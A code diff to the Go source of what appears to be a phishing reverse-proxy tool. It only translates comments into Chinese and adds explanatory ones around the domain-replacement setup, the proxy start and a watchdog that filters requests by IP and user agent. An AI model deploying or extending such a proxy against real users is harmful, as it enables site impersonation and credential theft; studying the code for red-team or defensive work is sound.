@@ -51,7 +51,7 @@ func (server *tlsServer) serveTLS() (err error) {
 
 func Run(sess *session.Session) {
 
-	// Load replacer rules
+	// 加载替换规则
 	var replacer = &Replacer{
 		Phishing:                      sess.Config.Proxy.Phishing,
 		Target:                        sess.Config.Proxy.Target,
@@ -60,17 +60,16 @@ func Run(sess *session.Session) {
 		OriginsMapping:                sess.Config.Crawler.OriginsMapping,
 		CustomResponseTransformations: sess.Config.Transform.Response.Custom,
 	}
-
+	// 定义 domain 的映射
 	if err := replacer.DomainMapping(); err != nil {
 		log.Fatal(err.Error())
 	}
+	// 准备替换表，还未进行替换
 	replacer.MakeReplacements()
 
-	//
-	// Start the reverse proxy
-	//
+	// 启动反向代理
 	http.HandleFunc("/", func(response http.ResponseWriter, request *http.Request) {
-		// TODO: Configure properly middlewares.
+		// TODO: 正确配置中间件
 		if sess.Config.Watchdog.Enabled {
 			m, err := sess.Module("watchdog")
 			if err != nil {
@@ -79,7 +78,9 @@ func Run(sess *session.Session) {
 
 			wd, ok := m.(*watchdog.Watchdog)
 			if ok {
+				// 根据 ip 与 ua 查看是否进行此次请求
 				if !wd.Allow(request) {
+					// 获得 response
 					wd.CustomResponse(response, request)
 					return
 				}
